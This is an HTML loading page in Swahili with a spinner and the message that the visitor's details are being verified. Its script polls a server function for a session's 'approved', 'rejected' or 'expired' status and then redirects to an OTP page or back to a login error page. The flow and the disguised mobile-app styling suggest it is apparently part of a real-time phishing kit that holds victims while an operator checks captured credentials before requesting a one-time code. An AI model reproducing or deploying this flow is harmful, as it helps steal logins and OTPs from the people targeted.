<!DOCTYPE html>
<html lang="sw">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Inapakia...</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, 'Inter', 'Segoe UI', Roboto, sans-serif;
        }

        body {
            background-color: #f2f2f7;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .app-container {
            width: 100%;
            max-width: 428px;
            height: 100vh;
            max-height: 926px;
            background-color: #ffffff;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            position: relative;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
        }

        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #E3000F;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading-text {
            font-size: 18px;
            color: #3a3a3c;
            font-weight: 500;
            text-align: center;
            padding: 0 20px;
        }
    </style>
</head>

<body>
    <div class="app-container">
        <div class="spinner"></div>
        <p class="loading-text">Tafadhali subiri, tunakagua taarifa zako...</p>
    </div>
    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const sid = urlParams.get('sid');
        const next = urlParams.get('next') || 'otp.html';
        const errorPage = urlParams.get('error') || 'login.html?error=1';

        if (!sid) {
            // No session ID - fallback to old behavior (timed redirect)
            const delay = parseInt(urlParams.get('delay')) || 3000;
            const msg = urlParams.get('msg');
            if (msg) {
                document.querySelector('.loading-text').textContent = decodeURIComponent(msg);
            }
            setTimeout(() => {
                window.location.href = next;
            }, delay);
        } else {
            // Poll for approval status
            let pollInterval = setInterval(async () => {
                try {
                    const res = await fetch('/.netlify/functions/check-status', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ sessionId: sid })
                    });
                    const data = await res.json();

                    if (data.status === 'approved') {
                        clearInterval(pollInterval);
                        window.location.href = next;
                    } else if (data.status === 'rejected') {
                        clearInterval(pollInterval);
                        window.location.href = errorPage;
                    } else if (data.status === 'expired') {
                        clearInterval(pollInterval);
                        window.location.href = errorPage;
                    }
                    // if "pending", keep polling
                } catch (err) {
                    console.error('Poll error:', err);
                }
            }, 2000);
        }
    </script>
</body>

</html>
